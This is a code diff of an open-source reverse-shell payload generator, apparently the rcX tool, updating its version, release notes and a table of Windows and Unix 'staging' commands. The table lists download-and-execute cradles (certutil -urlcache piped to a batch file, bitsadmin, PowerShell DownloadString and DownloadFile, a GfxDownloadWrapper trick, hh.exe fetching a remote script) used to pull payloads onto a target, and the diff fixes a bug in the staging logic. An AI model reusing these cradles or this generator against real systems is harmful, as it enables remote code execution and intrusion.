@@ -1,19 +1,18 @@
 # coding=utf8
 __Author__ = 'FlyfishSec'
-__Version__ = 'v0.0.5'
+__Version__ = 'v0.0.6'
 __SITE__ = 'https://github.com/FlyfishSec/rcX'
 __Description__ = ''''''
 
 __Release_Notes__ = '''
 ✨ New Features
- + Add perl bind shell
- + Add password protected netcat shell
+ + 
 
 🎨 Improvements
- + Code optimization
+ + 
  
 🐛 Bug fixes
- + Fix some bugs
+ + Fix a bug(About staging cmd)
  
 '''
 
@@ -360,7 +359,6 @@ def Generator(host="127.0.0.1", port="44444", port2="", shell_type="bash", shell
                     if password != "":
                         shell_type = "netcat-ssl-password"
             elif protocol in ["tcp", "udp"]:
-                print(1)
                 if "windows" in platform:
                     shell_type = "netcat-windows"
                     if password != "":
@@ -839,43 +837,42 @@ class PayloadWrapper:
             "1": {"name": "wget", "platform": "*", "binary": "wget", "args": " -qO- {0}", "description": ""},
             "2": {"name": "jrunscript", "platform": "*", "binary": "jrunscript", "args": '''-e "cp('{0}')"''',
                   "description": ""},
-            "3": {"name": "bitsadmin", "platform": "windows", "binary": "bitsadmin.exe",
+            "3": {"name": "bitsadmin", "platform": "windows", "binary": "bitsadmin",
                   "args": " /transfer n {0} %cd%\\0&&powershell gc 0",
                   "description": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"},
-            "4": {"name": "certutil", "platform": "windows", "binary": "certutil.exe",
-                  "args": "certutil -urlcache -split -f {0} cd.bat|cd.bat",
+            "4": {"name": "certutil", "platform": "windows", "binary": "certutil",
+                  "args": " -urlcache -split -f {0} cd.bat|cd.bat",
                   "description": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"},
-            "5": {"name": "powershell-Invoke-WebRequest", "platform": "windows", "binary": "powershell.exe",
+            "5": {"name": "powershell-Invoke-WebRequest", "platform": "windows", "binary": "powershell",
                   "args": ''' (IWR '{0}').Content''',
                   "description": "only windows"},
-            "6": {"name": "powershell-curl", "platform": "windows", "binary": "powershell.exe",
+            "6": {"name": "powershell-curl", "platform": "windows", "binary": "powershell",
                   "args": ''' (curl {0}).content''',
                   "description": "only windows"},
-            "7": {"name": "powershell-wget", "platform": "windows", "binary": "powershell.exe",
+            "7": {"name": "powershell-wget", "platform": "windows", "binary": "powershell",
                   "args": ''' (wget {0}).content''',
                   "description": "only windows"},
-            "8": {"name": "powershell-bitstransfer", "platform": "windows", "binary": "powershell.exe",
+            "8": {"name": "powershell-bitstransfer", "platform": "windows", "binary": "powershell",
                   "args": ''' "Import-Module bitstransfer;start-bitstransfer {0} 0;gc 0"''',
                   "description": "only windows"},
-            "9": {"name": "powershell-DownloadString", "platform": "windows", "binary": "powershell.exe",
+            "9": {"name": "powershell-DownloadString", "platform": "windows", "binary": "powershell",
                   "args": ''' (New-Object System.Net.WebClient).DownloadString('{0}')''',
                   "description": "only windows"},
-            "10": {"name": "powershell-DownloadFile", "platform": "windows", "binary": "powershell.exe",
+            "10": {"name": "powershell-DownloadFile", "platform": "windows", "binary": "powershell",
                    "args": ''' (New-Object System.Net.WebClient).DownloadFile('{0}','0');GC 0''',
                    "description": "only windows"},
-            "11": {"name": "certoc.exe", "platform": "windows", "binary": "certoc.exe", "args": "-GetCACAPS {0}",
+            "11": {"name": "certoc.exe", "platform": "windows", "binary": "certoc", "args": " -GetCACAPS {0}",
                    "description": "only Windows Server 2022"},
-            "12": {"name": "GfxDownloadWrapper.exe", "platform": "windows", "binary": "GfxDownloadWrapper.exe",
+            "12": {"name": "GfxDownloadWrapper.exe", "platform": "windows", "binary": "",
                    "args": '''forfiles /p %systemroot%\\system32\\DriverStore /s /m Gfxd*.exe /C "cmd /c for %I in (@path) do echo|set /p=%~I>%tmp%\0.cmd&echo %1 %2>>%tmp%\0.cmd"&&%tmp%\0 {0}''',
                    "description": "Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path."},
             "13": {"name": "hh.exe", "platform": "windows", "binary": "HH.exe", "args": " http://some.url/script.ps1",
                    "description": "Binary used for processing chm files in Windows"},
-            "14": {"name": "lwp", "platform": "*", "binary": "lwp-download ", "args": "{0}",
+            "14": {"name": "lwp", "platform": "*", "binary": "lwp-download ", "args": " {0}",
                    "description": "Only support http"},
             "15": {"name": "", "platform": "*", "binary": "", "args": "", "description": ""},
             "16": {"name": "", "platform": "*", "binary": "", "args": "", "description": ""},
             "17": {"name": "", "platform": "*", "binary": "curl", "args": "", "description": ""},
-
         }
 
         if staging_cmd in staging_cmds.keys():
@@ -889,7 +886,7 @@ class PayloadWrapper:
             elif staging_cmds[i]["platform"] == "windows" and "windows" in self.platform:
                 staged_payload = staging_cmds[i]["binary"] + staging_cmds[i]["args"].format(payload_url)
             elif staging_cmds[i]["platform"] == "windows" and "windows" not in self.platform:
-                staged_payload = staging_cmds["0"]["binary"] + staging_cmds[0]["args"].format(payload_url)
+                staged_payload = staging_cmds["0"]["binary"] + staging_cmds["0"]["args"].format(payload_url)
             else:
                 staged_payload = staging_cmds[i]["binary"] + staging_cmds[i]["args"].format(payload_url)
         else:
